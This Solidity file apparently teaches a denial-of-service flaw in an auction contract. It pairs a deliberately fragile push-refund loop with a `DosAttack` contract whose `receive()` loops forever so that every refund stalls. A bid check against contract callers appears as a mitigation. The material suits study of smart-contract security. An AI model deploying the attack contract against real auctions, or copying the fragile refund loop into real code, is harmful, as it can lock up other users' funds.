// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Dos {
  mapping (address => uint) public bidders;
  address[] public allBidders;
  uint public refundProgress;

  function bid() external payable {
    require(msg.sender.code.length == 0 , "no contracts"); //запрет ставок со смартконтракта
    bidders[msg.sender] += msg.value;
    allBidders.push(msg.sender);
  }


  //push
  function refund() external {
    for (uint i = refundProgress; i < allBidders.length; i++) {
      address bidder = allBidders[i];

      (bool success,) = bidder.call{value: bidders[bidder]}("");

      // if(!success) {
      //   //...
      // }

      require(success, "failed!");

      refundProgress++;
    }
  }

}

contract DosAttack {
  Dos auctionDos;
  bool hack = true;
  address payable owner;

  constructor(address _auction) {
    auctionDos = Dos(_auction);
    owner = payable(msg.sender);
  }

  function doBid() external payable {
    auctionDos.bid{value: msg.value}();
  }

  function toggleHack()  external {
    require(msg.sender == owner,"failed");

    hack = !hack;
  }

  receive() external payable {
    if(hack == true) {
      while (true) {}
    } else {
      owner.transfer(msg.value);
    }
    
  }

}